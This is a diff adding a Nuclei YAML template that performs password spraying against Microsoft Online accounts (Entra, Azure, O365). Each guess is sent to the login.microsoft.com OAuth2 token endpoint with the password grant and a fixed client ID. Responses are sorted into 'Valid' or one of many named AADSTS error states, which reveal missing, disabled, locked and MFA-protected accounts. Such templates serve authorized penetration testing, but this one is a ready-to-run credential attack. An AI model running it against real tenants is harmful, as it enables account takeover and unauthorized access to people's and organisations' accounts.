@@ -1,0 +1,1379 @@
+id: microsoft-online
+
+info:
+  name: Microsoft Online Password Spray
+  author: dwisiswant0
+  severity: info
+  description: |
+    This template executes password spraying attacks targeting Microsoft Online
+    accounts (such as Entra, Azure, or O365), offering comprehensive insights
+    into account status and any encountered errors.
+
+    'Valid' indicates that the username & password combination has been
+    successfully authorized.
+  reference:
+    - https://github.com/MicrosoftDocs/entra-docs/blob/main/docs/identity-platform/reference-error-codes.md
+    - https://github.com/dafthack/MSOLSpray
+  tags: password-spray,microsoft,microsoft-online,entra,azure,o365
+
+variables:
+  resource: "{{url_encode('https://graph.windows.net')}}"
+  client_id: "1b730954-1685-4b74-9bfd-dac224a7b894"
+
+self-contained: true
+http:
+  - method: POST
+    path:
+      - "https://login.microsoft.com/common/oauth2/token"
+    headers:
+      Accept: "application/json"
+      Content-Type: "application/x-www-form-urlencoded"
+    body: |
+      resource={{resource}}&client_id={{client_id}}&client_info=1&grant_type=password&username={{url_encode(username)}}&password={{url_encode(password)}}&scope=openid
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        name: Valid
+        dsl:
+          - 'status_code == 200'
+          # - 'error_description == ""'
+
+      # Do we need to record detailed errors,
+      # or only on matching valid credentials?
+
+      - type: dsl
+        name: InteractionRequired
+        dsl:
+          - 'contains(error_description, "AADSTS16000")'
+
+      - type: dsl
+        name: UserAccountSelectionInvalid
+        dsl:
+          - 'contains(error_description, "AADSTS16001")'
+
+      - type: dsl
+        name: AppSessionSelectionInvalid
+        dsl:
+          - 'contains(error_description, "AADSTS16002")'
+
+      - type: dsl
+        name: AppSessionSelectionInvalidSessionNotExist
+        dsl:
+          - 'contains(error_description, "AADSTS160021")'
+
+      - type: dsl
+        name: SsoUserAccountNotFoundInResourceTenant
+        dsl:
+          - 'contains(error_description, "AADSTS16003")'
+
+      - type: dsl
+        name: CredentialKeyProvisioningFailed
+        dsl:
+          - 'contains(error_description, "AADSTS17003")'
+
+      - type: dsl
+        name: WsFedSignInResponseError
+        dsl:
+          - 'contains(error_description, "AADSTS20001")'
+
+      - type: dsl
+        name: WsFedMessageInvalid
+        dsl:
+          - 'contains(error_description, "AADSTS20012")'
+
+      - type: dsl
+        name: FedMetadataInvalidTenantName
+        dsl:
+          - 'contains(error_description, "AADSTS20033")'
+
+      - type: dsl
+        name: CachedCredentialNonGWAuthNRequestsNotSupported
+        dsl:
+          - 'contains(error_description, "AADSTS230109")'
+
+      - type: dsl
+        name: OAuth2IdPUnretryableServerError
+        dsl:
+          - 'contains(error_description, "AADSTS40008")'
+
+      - type: dsl
+        name: OAuth2IdPRefreshTokenRedemptionUserError
+        dsl:
+          - 'contains(error_description, "AADSTS40009")'
+
+      - type: dsl
+        name: OAuth2IdPRetryableServerError
+        dsl:
+          - 'contains(error_description, "AADSTS40010")'
+
+      - type: dsl
+        name: OAuth2IdPAuthCodeRedemptionUserError
+        dsl:
+          - 'contains(error_description, "AADSTS40015")'
+
+      - type: dsl
+        name: TokenIssuanceError
+        dsl:
+          - 'contains(error_description, "AADSTS50000")'
+
+      - type: dsl
+        name: InvalidResource
+        dsl:
+          - 'contains(error_description, "AADSTS50001")'
+
+      - type: dsl
+        name: NotAllowedTenant
+        dsl:
+          - 'contains(error_description, "AADSTS50002")'
+
+      - type: dsl
+        name: InvalidResourceServicePrincipalNotFound
+        dsl:
+          - 'contains(error_description, "AADSTS500011")'
+
+      - type: dsl
+        name: MissingSigningKey
+        dsl:
+          - 'contains(error_description, "AADSTS50003")'
+
+      - type: dsl
+        name: DevicePolicyError
+        dsl:
+          - 'contains(error_description, "AADSTS50005")'
+
+      - type: dsl
+        name: InvalidSignature
+        dsl:
+          - 'contains(error_description, "AADSTS50006")'
+
+      - type: dsl
+        name: PartnerEncryptionCertificateMissing
+        dsl:
+          - 'contains(error_description, "AADSTS50007")'
+
+      - type: dsl
+        name: InvalidSamlToken
+        dsl:
+          - 'contains(error_description, "AADSTS50008")'
+
+      - type: dsl
+        name: InvalidSamlTokenEmailMissingOrInvalid
+        dsl:
+          - 'contains(error_description, "AADSTS5000819")'
+
+      - type: dsl
+        name: AudienceUriValidationFailed
+        dsl:
+          - 'contains(error_description, "AADSTS50010")'
+
+      - type: dsl
+        name: InvalidReplyTo
+        dsl:
+          - 'contains(error_description, "AADSTS50011")'
+
+      - type: dsl
+        name: AuthenticationFailed
+        dsl:
+          - 'contains(error_description, "AADSTS50012")'
+
+      - type: dsl
+        name: InvalidAssertion
+        dsl:
+          - 'contains(error_description, "AADSTS50013")'
+
+      - type: dsl
+        name: GuestUserInPendingState
+        dsl:
+          - 'contains(error_description, "AADSTS50014")'
+
+      - type: dsl
+        name: ViralUserLegalAgeConsentRequiredState
+        dsl:
+          - 'contains(error_description, "AADSTS50015")'
+
+      - type: dsl
+        name: CertificateValidationFailed
+        dsl:
+          - 'contains(error_description, "AADSTS50017")'
+
+      - type: dsl
+        name: UserUnauthorized
+        dsl:
+          - 'contains(error_description, "AADSTS50020")'
+
+      - type: dsl
+        name: NotAllowedByOutboundPolicyTenant
+        dsl:
+          - 'contains(error_description, "AADSTS500212")'
+
+      - type: dsl
+        name: NotAllowedByInboundPolicyTenant
+        dsl:
+          - 'contains(error_description, "AADSTS500213")'
+
+      - type: dsl
+        name: InvalidJwtToken
+        dsl:
+          - 'contains(error_description, "AADSTS50027")'
+
+      - type: dsl
+        name: WeakRsaKey
+        dsl:
+          - 'contains(error_description, "AADSTS50032")'
+
+      - type: dsl
+        name: RetryableError
+        dsl:
+          - 'contains(error_description, "AADSTS50033")'
+
+      - type: dsl
+        name: UserAccountNotFound
+        dsl:
+          - 'contains(error_description, "AADSTS50034")'
+
+      - type: dsl
+        name: UnableToGeneratePairwiseIdentifierWithMissingSalt
+        dsl:
+          - 'contains(error_description, "AADSTS50042")'
+
+      - type: dsl
+        name: UnableToGeneratePairwiseIdentifierWithMultipleSalts
+        dsl:
+          - 'contains(error_description, "AADSTS50043")'
+
+      - type: dsl
+        name: SubjectMismatchesIssuer
+        dsl:
+          - 'contains(error_description, "AADSTS50048")'
+
+      - type: dsl
+        name: NoSuchInstanceForDiscovery
+        dsl:
+          - 'contains(error_description, "AADSTS50049")'
+
+      - type: dsl
+        name: MalformedDiscoveryRequest
+        dsl:
+          - 'contains(error_description, "AADSTS50050")'
+
+      - type: dsl
+        name: InvalidPasswordExpiredPassword
+        dsl:
+          - 'contains(error_description, "AADSTS50055")'
+
+      - type: dsl
+        name: UserDisabled
+        dsl:
+          - 'contains(error_description, "AADSTS50057")'
+
+      - type: dsl
+        name: UserInformationNotProvided
+        dsl:
+          - 'contains(error_description, "AADSTS50058")'
+
+      - type: dsl
+        name: MissingTenantRealmAndNoUserInformationProvided
+        dsl:
+          - 'contains(error_description, "AADSTS50059")'
+
+      - type: dsl
+        name: SignoutInvalidRequest
+        dsl:
+          - 'contains(error_description, "AADSTS50061")'
+
+      - type: dsl
+        name: CredentialAuthenticationError
+        dsl:
+          - 'contains(error_description, "AADSTS50064")'
+
+      - type: dsl
+        name: SignoutInitiatorNotParticipant
+        dsl:
+          - 'contains(error_description, "AADSTS50068")'
+
+      - type: dsl
+        name: SignoutUnknownSessionIdentifier
+        dsl:
+          - 'contains(error_description, "AADSTS50070")'
+
+      - type: dsl
+        name: SignoutMessageExpired
+        dsl:
+          - 'contains(error_description, "AADSTS50071")'
+
+      - type: dsl
+        name: UserStrongAuthEnrollmentRequiredInterrupt
+        dsl:
+          - 'contains(error_description, "AADSTS50072")'
+
+      - type: dsl
+        name: UserStrongAuthClientAuthNRequiredInterrupt
+        dsl:
+          - 'contains(error_description, "AADSTS50074")'
+
+      - type: dsl
+        name: UserStrongAuthClientAuthNRequired
+        dsl:
+          - 'contains(error_description, "AADSTS50076")'
+
+      - type: dsl
+        name: UserStrongAuthExpired
+        dsl:
+          - 'contains(error_description, "AADSTS50078")'
+
+      - type: dsl
+        name: UserStrongAuthEnrollmentRequired
+        dsl:
+          - 'contains(error_description, "AADSTS50079")'
+
+      - type: dsl
+        name: SasNonRetryableError
+        dsl:
+          - 'contains(error_description, "AADSTS50086")'
+
+      - type: dsl
+        name: SasRetryableError
+        dsl:
+          - 'contains(error_description, "AADSTS50087")'
+
+      - type: dsl
+        name: DeviceAuthenticationRequired
+        dsl:
+          - 'contains(error_description, "AADSTS50097")'
+
+      - type: dsl
+        name: PKeyAuthInvalidJwtUnauthorized
+        dsl:
+          - 'contains(error_description, "AADSTS50099")'
+
+      - type: dsl
+        name: EntitlementGrantsNotFound
+        dsl:
+          - 'contains(error_description, "AADSTS50105")'
+
+      - type: dsl
+        name: InvalidRealmUri
+        dsl:
+          - 'contains(error_description, "AADSTS50107")'
+
+      - type: dsl
+        name: ThresholdJwtInvalidJwtFormat
+        dsl:
+          - 'contains(error_description, "AADSTS50120")'
+
+      - type: dsl
+        name: ClaimsTransformationInvalidInputParameter
+        dsl:
+          - 'contains(error_description, "AADSTS50124")'
+
+      - type: dsl
+        name: PasswordResetRegistrationRequiredInterrupt
+        dsl:
+          - 'contains(error_description, "AADSTS50125")'
+
+      - type: dsl
+        name: InvalidUserNameOrPassword
+        dsl:
+          - 'contains(error_description, "AADSTS50126")'
+
+      - type: dsl
+        name: BrokerAppNotInstalled
+        dsl:
+          - 'contains(error_description, "AADSTS50127")'
+
+      - type: dsl
+        name: DeviceIsNotWorkplaceJoined
+        dsl:
+          - 'contains(error_description, "AADSTS50129")'
+
+      - type: dsl
+        name: ConditionalAccessFailed
+        dsl:
+          - 'contains(error_description, "AADSTS50131")'
+
+      - type: dsl
+        name: SsoArtifactInvalidOrExpired
+        dsl:
+          - 'contains(error_description, "AADSTS50132")'
+
+      - type: dsl
+        name: SsoArtifactRevoked
+        dsl:
+          - 'contains(error_description, "AADSTS50133")'
+
+      - type: dsl
+        name: DeviceFlowAuthorizeWrongDatacenter
+        dsl:
+          - 'contains(error_description, "AADSTS50134")'
+
+      - type: dsl
+        name: PasswordChangeCompromisedPassword
+        dsl:
+          - 'contains(error_description, "AADSTS50135")'
+
+      - type: dsl
+        name: RedirectMsaSessionToApp
+        dsl:
+          - 'contains(error_description, "AADSTS50136")'
+
+      - type: dsl
+        name: SessionMissingMsaOAuth2RefreshToken
+        dsl:
+          - 'contains(error_description, "AADSTS50139")'
+
+      - type: dsl
+        name: KmsiInterrupt
+        dsl:
+          - 'contains(error_description, "AADSTS50140")'
+
+      - type: dsl
+        name: InvalidPasswordExpiredOnPremPassword
+        dsl:
+          - 'contains(error_description, "AADSTS50144")'
+
+      - type: dsl
+        name: MissingCustomSigningKey
+        dsl:
+          - 'contains(error_description, "AADSTS50146")'
+
+      - type: dsl
+        name: AcceptMappedClaims
+        dsl:
+          - 'contains(error_description, "AADSTS501461")'
+
+      - type: dsl
+        name: MissingCodeChallenge
+        dsl:
+          - 'contains(error_description, "AADSTS50147")'
+
+      - type: dsl
+        name: InvalidCodeChallengeMethodInvalidSize
+        dsl:
+          - 'contains(error_description, "AADSTS501491")'
+
+      - type: dsl
+        name: DeviceAuthenticationFailed
+        dsl:
+          - 'contains(error_description, "AADSTS50155")'
+
+      - type: dsl
+        name: ExternalSecurityChallenge
+        dsl:
+          - 'contains(error_description, "AADSTS50158")'
+
+      - type: dsl
+        name: InvalidExternalSecurityChallengeConfiguration
+        dsl:
+          - 'contains(error_description, "AADSTS50161")'
+
+      - type: dsl
+        name: ExternalClaimsProviderThrottled
+        dsl:
+          - 'contains(error_description, "AADSTS50166")'
+
+      - type: dsl
+        name: ChromeBrowserSsoInterruptRequired
+        dsl:
+          - 'contains(error_description, "AADSTS50168")'
+
+      - type: dsl
+        name: InvalidRequestBadRealm
+        dsl:
+          - 'contains(error_description, "AADSTS50169")'
+
+      - type: dsl
+        name: MissingExternalClaimsProviderMapping
+        dsl:
+          - 'contains(error_description, "AADSTS50170")'
+
+      - type: dsl
+        name: FreshTokenNeeded
+        dsl:
+          - 'contains(error_description, "AADSTS50173")'
+
+      - type: dsl
+        name: ExternalChallengeNotSupportedForPassthroughUsers
+        dsl:
+          - 'contains(error_description, "AADSTS50177")'
+
+      - type: dsl
+        name: SessionControlNotSupportedForPassthroughUsers
+        dsl:
+          - 'contains(error_description, "AADSTS50178")'
+
+      - type: dsl
+        name: WindowsIntegratedAuthMissing
+        dsl:
+          - 'contains(error_description, "AADSTS50180")'
+
+      - type: dsl
+        name: DeviceInformationNotProvided
+        dsl:
+          - 'contains(error_description, "AADSTS50187")'
+
+      - type: dsl
+        name: LoopDetected
+        dsl:
+          - 'contains(error_description, "AADSTS50196")'
+
+      - type: dsl
+        name: ConflictingIdentities
+        dsl:
+          - 'contains(error_description, "AADSTS50197")'
+
+      - type: dsl
+        name: CmsiInterrupt
+        dsl:
+          - 'contains(error_description, "AADSTS50199")'
+
+      - type: dsl
+        name: RequiredFeatureNotEnabled
+        dsl:
+          - 'contains(error_description, "AADSTS51000")'
+
+      - type: dsl
+        name: DomainHintMustbePresent
+        dsl:
+          - 'contains(error_description, "AADSTS51001")'
+
+      - type: dsl
+        name: XCB2BResourceCloudNotAllowedOnIdentityTenant
+        dsl:
+          - 'contains(error_description, "AADSTS1000104")'
+
+      - type: dsl
+        name: UserAccountNotInDirectory
+        dsl:
+          - 'contains(error_description, "AADSTS51004")'
+
+      - type: dsl
+        name: TemporaryRedirect
+        dsl:
+          - 'contains(error_description, "AADSTS51005")'
+
+      - type: dsl
+        name: ForceReauthDueToInsufficientAuth
+        dsl:
+          - 'contains(error_description, "AADSTS51006")'
+
+      - type: dsl
+        name: DelegationDoesNotExistForLinkedIn
+        dsl:
+          - 'contains(error_description, "AADSTS52004")'
+
+      - type: dsl
+        name: DeviceNotCompliant
+        dsl:
+          - 'contains(error_description, "AADSTS53000")'
+
+      - type: dsl
+        name: DeviceNotDomainJoined
+        dsl:
+          - 'contains(error_description, "AADSTS53001")'
+
+      - type: dsl
+        name: ApplicationUsedIsNotAnApprovedApp
+        dsl:
+          - 'contains(error_description, "AADSTS53002")'
+
+      - type: dsl
+        name: BlockedByConditionalAccess
+        dsl:
+          - 'contains(error_description, "AADSTS53003")'
+
+      - type: dsl
+        name: BlockedBySecurityDefaults
+        dsl:
+          - 'contains(error_description, "AADSTS530035")'
+
+      - type: dsl
+        name: ProofUpBlockedDueToRisk
+        dsl:
+          - 'contains(error_description, "AADSTS53004")'
+
+      - type: dsl
+        name: ProofUpBlockedDueToSecurityInfoAcr
+        dsl:
+          - 'contains(error_description, "AADSTS53010")'
+
+      - type: dsl
+        name: DelegatedAdminBlockedDueToSuspiciousActivity
+        dsl:
+          - 'contains(error_description, "AADSTS530034")'
+
+      - type: dsl
+        name: MinorUserBlockedLegalAgeGroupRule
+        dsl:
+          - 'contains(error_description, "AADSTS54000")'
+
+      - type: dsl
+        name: DelegationDoesNotExist
+        dsl:
+          - 'contains(error_description, "AADSTS65001")'
+
+      - type: dsl
+        name: UserDeclinedConsent
+        dsl:
+          - 'contains(error_description, "AADSTS65004")'
+
+      - type: dsl
+        name: MisconfiguredApplication
+        dsl:
+          - 'contains(error_description, "AADSTS65005")'
+
+      - type: dsl
+        name: ActorNotValidServiceIdentity
+        dsl:
+          - 'contains(error_description, "AADSTS67003")'
+
+      - type: dsl
+        name: InvalidGrant
+        dsl:
+          - 'contains(error_description, "AADSTS70000")'
+
+      - type: dsl
+        name: UnauthorizedClient
+        dsl:
+          - 'contains(error_description, "AADSTS70001")'
+
+      - type: dsl
+        name: UnauthorizedClientAppNotFoundInOrgIdTenant
+        dsl:
+          - 'contains(error_description, "AADSTS700011")'
+
+      - type: dsl
+        name: InvalidClient
+        dsl:
+          - 'contains(error_description, "AADSTS70002")'
+
+      - type: dsl
+        name: InvalidClientPublicClientWithCredential
+        dsl:
+          - 'contains(error_description, "AADSTS700025")'
+
+      - type: dsl
+        name: UnsupportedGrantType
+        dsl:
+          - 'contains(error_description, "AADSTS70003")'
+
+      - type: dsl
+        name: InvalidRedirectUri
+        dsl:
+          - 'contains(error_description, "AADSTS70004")'
+
+      - type: dsl
+        name: UnsupportedResponseType
+        dsl:
+          - 'contains(error_description, "AADSTS70005")'
+
+      - type: dsl
+        name: UnsupportedResponseMode
+        dsl:
+          - 'contains(error_description, "AADSTS70007")'
+
+      - type: dsl
+        name: ExpiredOrRevokedGrant
+        dsl:
+          - 'contains(error_description, "AADSTS70008")'
+
+      - type: dsl
+        name: ExpiredOrRevokedGrantInactiveToken
+        dsl:
+          - 'contains(error_description, "AADSTS700082")'
+
+      - type: dsl
+        name: InvalidScope
+        dsl:
+          - 'contains(error_description, "AADSTS70011")'
+
+      - type: dsl
+        name: MsaServerError
+        dsl:
+          - 'contains(error_description, "AADSTS70012")'
+
+      - type: dsl
+        name: AuthorizationPending
+        dsl:
+          - 'contains(error_description, "AADSTS70016")'
+
+      - type: dsl
+        name: BadVerificationCode
+        dsl:
+          - 'contains(error_description, "AADSTS70018")'
+
+      - type: dsl
+        name: CodeExpired
+        dsl:
+          - 'contains(error_description, "AADSTS70019")'
+
+      - type: dsl
+        name: BadTokenDueToSignInFrequency
+        dsl:
+          - 'contains(error_description, "AADSTS70043")'
+
+      - type: dsl
+        name: BindingSerializationError
+        dsl:
+          - 'contains(error_description, "AADSTS75001")'
+
+      - type: dsl
+        name: UnsupportedBindingError
+        dsl:
+          - 'contains(error_description, "AADSTS75003")'
+
+      - type: dsl
+        name: Saml2MessageInvalid
+        dsl:
+          - 'contains(error_description, "AADSTS75005")'
+
+      - type: dsl
+        name: SAMLRequest
+        dsl:
+          - 'contains(error_description, "AADSTS750054")'
+
+      - type: dsl
+        name: RequestDeniedError
+        dsl:
+          - 'contains(error_description, "AADSTS75008")'
+
+      - type: dsl
+        name: NoMatchedAuthnContextInOutputClaims
+        dsl:
+          - 'contains(error_description, "AADSTS75011")'
+
+      - type: dsl
+        name: Saml2AuthenticationRequestInvalidNameIDPolicy
+        dsl:
+          - 'contains(error_description, "AADSTS75016")'
+
+      - type: dsl
+        name: ApplicationRequiresSignedRequests
+        dsl:
+          - 'contains(error_description, "AADSTS76021")'
+
+      - type: dsl
+        name: RequestIssueTimeExpired
+        dsl:
+          - 'contains(error_description, "AADSTS76026")'
+
+      - type: dsl
+        name: OnPremiseStoreIsNotAvailable
+        dsl:
+          - 'contains(error_description, "AADSTS80001")'
+
+      - type: dsl
+        name: OnPremisePasswordValidatorRequestTimedout
+        dsl:
+          - 'contains(error_description, "AADSTS80002")'
+
+      - type: dsl
+        name: OnPremisePasswordValidatorUnpredictableWebException
+        dsl:
+          - 'contains(error_description, "AADSTS80005")'
+
+      - type: dsl
+        name: OnPremisePasswordValidatorErrorOccurredOnPrem
+        dsl:
+          - 'contains(error_description, "AADSTS80007")'
+
+      - type: dsl
+        name: OnPremisePasswordValidationEncryptionException
+        dsl:
+          - 'contains(error_description, "AADSTS80010")'
+
+      - type: dsl
+        name: OnPremisePasswordValidationAccountLogonInvalidHours
+        dsl:
+          - 'contains(error_description, "AADSTS80012")'
+
+      - type: dsl
+        name: OnPremisePasswordValidationTimeSkew
+        dsl:
+          - 'contains(error_description, "AADSTS80013")'
+
+      - type: dsl
+        name: OnPremisePasswordValidationAuthenticationAgentTimeout
+        dsl:
+          - 'contains(error_description, "AADSTS80014")'
+
+      - type: dsl
+        name: DesktopSsoIdentityInTicketIsNotAuthenticated
+        dsl:
+          - 'contains(error_description, "AADSTS81004")'
+
+      - type: dsl
+        name: DesktopSsoAuthenticationPackageNotSupported
+        dsl:
+          - 'contains(error_description, "AADSTS81005")'
+
+      - type: dsl
+        name: DesktopSsoNoAuthorizationHeader
+        dsl:
+          - 'contains(error_description, "AADSTS81006")'
+
+      - type: dsl
+        name: DesktopSsoTenantIsNotOptIn
+        dsl:
+          - 'contains(error_description, "AADSTS81007")'
+
+      - type: dsl
+        name: DesktopSsoAuthorizationHeaderValueWithBadFormat
+        dsl:
+          - 'contains(error_description, "AADSTS81009")'
+
+      - type: dsl
+        name: DesktopSsoAuthTokenInvalid
+        dsl:
+          - 'contains(error_description, "AADSTS81010")'
+
+      - type: dsl
+        name: DesktopSsoLookupUserBySidFailed
+        dsl:
+          - 'contains(error_description, "AADSTS81011")'
+
+      - type: dsl
+        name: DesktopSsoMismatchBetweenTokenUpnAndChosenUpn
+        dsl:
+          - 'contains(error_description, "AADSTS81012")'
+
+      - type: dsl
+        name: InvalidTenantName
+        dsl:
+          - 'contains(error_description, "AADSTS90002")'
+
+      - type: dsl
+        name: InvalidRequestFormat
+        dsl:
+          - 'contains(error_description, "AADSTS90004")'
+
+      - type: dsl
+        name: InvalidRequestWithMultipleRequirements
+        dsl:
+          - 'contains(error_description, "AADSTS90005")'
+
+      - type: dsl
+        name: ExternalServerRetryableError
+        dsl:
+          - 'contains(error_description, "AADSTS90006")'
+
+      - type: dsl
+        name: InvalidSessionId
+        dsl:
+          - 'contains(error_description, "AADSTS90007")'
+
+      - type: dsl
+        name: TokenForItselfRequiresGraphPermission
+        dsl:
+          - 'contains(error_description, "AADSTS90008")'
+
+      - type: dsl
+        name: TokenForItselfMissingIdenticalAppIdentifier
+        dsl:
+          - 'contains(error_description, "AADSTS90009")'
+
+      - type: dsl
+        name: NotSupported
+        dsl:
+          - 'contains(error_description, "AADSTS90010")'
+
+      - type: dsl
+        name: RequestTimeout
+        dsl:
+          - 'contains(error_description, "AADSTS90012")'
+
+      - type: dsl
+        name: InvalidUserInput
+        dsl:
+          - 'contains(error_description, "AADSTS90013")'
+
+      - type: dsl
+        name: MissingRequiredField
+        dsl:
+          - 'contains(error_description, "AADSTS90014")'
+
+      - type: dsl
+        name: QueryStringTooLong
+        dsl:
+          - 'contains(error_description, "AADSTS90015")'
+
+      - type: dsl
+        name: MissingRequiredClaim
+        dsl:
+          - 'contains(error_description, "AADSTS90016")'
+
+      - type: dsl
+        name: MissingTenantRealm
+        dsl:
+          - 'contains(error_description, "AADSTS90019")'
+
+      - type: dsl
+        name: AuthenticatedInvalidPrincipalNameFormat
+        dsl:
+          - 'contains(error_description, "AADSTS90022")'
+
+      - type: dsl
+        name: InvalidRequest
+        dsl:
+          - 'contains(error_description, "AADSTS90023")'
+
+      - type: dsl
+        name: InvalidRequestSamlPropertyUnsupported
+        dsl:
+          - 'contains(error_description, "AADSTS900236")'
+
+      - type: dsl
+        name: InvalidRequest
+        dsl:
+          - 'contains(error_description, "AADSTS9002313")'
+
+      - type: dsl
+        name: RequestBudgetExceededError
+        dsl:
+          - 'contains(error_description, "AADSTS90024")'
+
+      - type: dsl
+        name: MsodsServiceUnavailable
+        dsl:
+          - 'contains(error_description, "AADSTS90033")'
+
+      - type: dsl
+        name: MsodsServiceUnretryableFailure
+        dsl:
+          - 'contains(error_description, "AADSTS90036")'
+
+      - type: dsl
+        name: NationalCloudTenantRedirection
+        dsl:
+          - 'contains(error_description, "AADSTS90038")'
+
+      - type: dsl
+        name: NationalCloudAuthCodeRedirection
+        dsl:
+          - 'contains(error_description, "AADSTS90043")'
+
+      - type: dsl
+        name: InvalidNationalCloudId
+        dsl:
+          - 'contains(error_description, "AADSTS90051")'
+
+      - type: dsl
+        name: TenantThrottlingError
+        dsl:
+          - 'contains(error_description, "AADSTS90055")'
+
+      - type: dsl
+        name: BadResourceRequest
+        dsl:
+          - 'contains(error_description, "AADSTS90056")'
+
+      - type: dsl
+        name: BadResourceRequestInvalidRequest
+        dsl:
+          - 'contains(error_description, "AADSTS900561")'
+
+      - type: dsl
+        name: PassThroughUserMfaError
+        dsl:
+          - 'contains(error_description, "AADSTS90072")'
+
+      - type: dsl
+        name: OrgIdWsFederationMessageInvalid
+        dsl:
+          - 'contains(error_description, "AADSTS90081")'
+
+      - type: dsl
+        name: OrgIdWsFederationNotSupported
+        dsl:
+          - 'contains(error_description, "AADSTS90082")'
+
+      - type: dsl
+        name: OrgIdWsFederationGuestNotAllowed
+        dsl:
+          - 'contains(error_description, "AADSTS90084")'
+
+      - type: dsl
+        name: OrgIdWsFederationSltRedemptionFailed
+        dsl:
+          - 'contains(error_description, "AADSTS90085")'
+
+      - type: dsl
+        name: OrgIdWsTrustDaTokenExpired
+        dsl:
+          - 'contains(error_description, "AADSTS90086")'
+
+      - type: dsl
+        name: OrgIdWsFederationMessageCreationFromUriFailed
+        dsl:
+          - 'contains(error_description, "AADSTS90087")'
+
+      - type: dsl
+        name: GraphRetryableError
+        dsl:
+          - 'contains(error_description, "AADSTS90090")'
+
+      - type: dsl
+        name: GraphServiceUnreachable
+        dsl:
+          - 'contains(error_description, "AADSTS90091")'
+
+      - type: dsl
+        name: GraphNonRetryableError
+        dsl:
+          - 'contains(error_description, "AADSTS90092")'
+
+      - type: dsl
+        name: GraphUserUnauthorized
+        dsl:
+          - 'contains(error_description, "AADSTS90093")'
+
+      - type: dsl
+        name: AdminConsentRequired
+        dsl:
+          - 'contains(error_description, "AADSTS90094")'
+
+      - type: dsl
+        name: AdminConsentRequiredRequestAccess
+        dsl:
+          - 'contains(error_description, "AADSTS90095")'
+
+      - type: dsl
+        name: InvalidRequestParameter
+        dsl:
+          - 'contains(error_description, "AADSTS90100")'
+
+      - type: dsl
+        name: AADSTS901002
+        dsl:
+          - 'contains(error_description, "AADSTS901002")'
+
+      - type: dsl
+        name: InvalidEmailAddress
+        dsl:
+          - 'contains(error_description, "AADSTS90101")'
+
+      - type: dsl
+        name: InvalidUriParameter
+        dsl:
+          - 'contains(error_description, "AADSTS90102")'
+
+      - type: dsl
+        name: InvalidXml
+        dsl:
+          - 'contains(error_description, "AADSTS90107")'
+
+      - type: dsl
+        name: InvalidExpiryDate
+        dsl:
+          - 'contains(error_description, "AADSTS90114")'
+
+      - type: dsl
+        name: InvalidRequestInput
+        dsl:
+          - 'contains(error_description, "AADSTS90117")'
+
+      - type: dsl
+        name: InvalidUserCode
+        dsl:
+          - 'contains(error_description, "AADSTS90119")'
+
+      - type: dsl
+        name: InvalidDeviceFlowRequest
+        dsl:
+          - 'contains(error_description, "AADSTS90120")'
+
+      - type: dsl
+        name: InvalidEmptyRequest
+        dsl:
+          - 'contains(error_description, "AADSTS90121")'
+
+      - type: dsl
+        name: IdentityProviderAccessDenied
+        dsl:
+          - 'contains(error_description, "AADSTS90123")'
+
+      - type: dsl
+        name: V1ResourceV2GlobalEndpointNotSupported
+        dsl:
+          - 'contains(error_description, "AADSTS90124")'
+
+      - type: dsl
+        name: DebugModeEnrollTenantNotFound
+        dsl:
+          - 'contains(error_description, "AADSTS90125")'
+
+      - type: dsl
+        name: DebugModeEnrollTenantNotInferred
+        dsl:
+          - 'contains(error_description, "AADSTS90126")'
+
+      - type: dsl
+        name: NonConvergedAppV2GlobalEndpointNotSupported
+        dsl:
+          - 'contains(error_description, "AADSTS90130")'
+
+      - type: dsl
+        name: PasswordChangeIncorrectCurrentPassword
+        dsl:
+          - 'contains(error_description, "AADSTS120000")'
+
+      - type: dsl
+        name: PasswordChangeInvalidNewPasswordWeak
+        dsl:
+          - 'contains(error_description, "AADSTS120002")'
+
+      - type: dsl
+        name: PasswordChangeInvalidNewPasswordContainsMemberName
+        dsl:
+          - 'contains(error_description, "AADSTS120003")'
+
+      - type: dsl
+        name: PasswordChangeOnPremComplexity
+        dsl:
+          - 'contains(error_description, "AADSTS120004")'
+
+      - type: dsl
+        name: PasswordChangeOnPremSuccessCloudFail
+        dsl:
+          - 'contains(error_description, "AADSTS120005")'
+
+      - type: dsl
+        name: PasswordChangeAsyncJobStateTerminated
+        dsl:
+          - 'contains(error_description, "AADSTS120008")'
+
+      - type: dsl
+        name: PasswordChangeAsyncUpnInferenceFailed
+        dsl:
+          - 'contains(error_description, "AADSTS120011")'
+
+      - type: dsl
+        name: PasswordChangeNeedsToHappenOnPrem
+        dsl:
+          - 'contains(error_description, "AADSTS120012")'
+
+      - type: dsl
+        name: PasswordChangeOnPremisesConnectivityFailure
+        dsl:
+          - 'contains(error_description, "AADSTS120013")'
+
+      - type: dsl
+        name: PasswordChangeOnPremUserAccountLockedOutOrDisabled
+        dsl:
+          - 'contains(error_description, "AADSTS120014")'
+
+      - type: dsl
+        name: PasswordChangeADAdminActionRequired
+        dsl:
+          - 'contains(error_description, "AADSTS120015")'
+
+      - type: dsl
+        name: PasswordChangeUserNotFoundBySspr
+        dsl:
+          - 'contains(error_description, "AADSTS120016")'
+
+      - type: dsl
+        name: PasswordChangePasswordDoesnotComplyFuzzyPolicy
+        dsl:
+          - 'contains(error_description, "AADSTS120018")'
+
+      - type: dsl
+        name: PasswordChangeFailure
+        dsl:
+          - 'contains(error_description, "AADSTS120020")'
+
+      - type: dsl
+        name: PartnerServiceSsprInternalServiceError
+        dsl:
+          - 'contains(error_description, "AADSTS120021")'
+
+      - type: dsl
+        name: NgcKeyNotFound
+        dsl:
+          - 'contains(error_description, "AADSTS130004")'
+
+      - type: dsl
+        name: NgcInvalidSignature
+        dsl:
+          - 'contains(error_description, "AADSTS130005")'
+
+      - type: dsl
+        name: NgcTransportKeyNotFound
+        dsl:
+          - 'contains(error_description, "AADSTS130006")'
+
+      - type: dsl
+        name: NgcDeviceIsDisabled
+        dsl:
+          - 'contains(error_description, "AADSTS130007")'
+
+      - type: dsl
+        name: NgcDeviceIsNotFound
+        dsl:
+          - 'contains(error_description, "AADSTS130008")'
+
+      - type: dsl
+        name: KeyNotFound
+        dsl:
+          - 'contains(error_description, "AADSTS135010")'
+
+      - type: dsl
+        name: InvalidRequestNonce
+        dsl:
+          - 'contains(error_description, "AADSTS140000")'
+
+      - type: dsl
+        name: InvalidSessionKey
+        dsl:
+          - 'contains(error_description, "AADSTS140001")'
+
+      - type: dsl
+        name: InvalidApiRequest
+        dsl:
+          - 'contains(error_description, "AADSTS165900")'
+
+      - type: dsl
+        name: UnsupportedAndroidWebViewVersion
+        dsl:
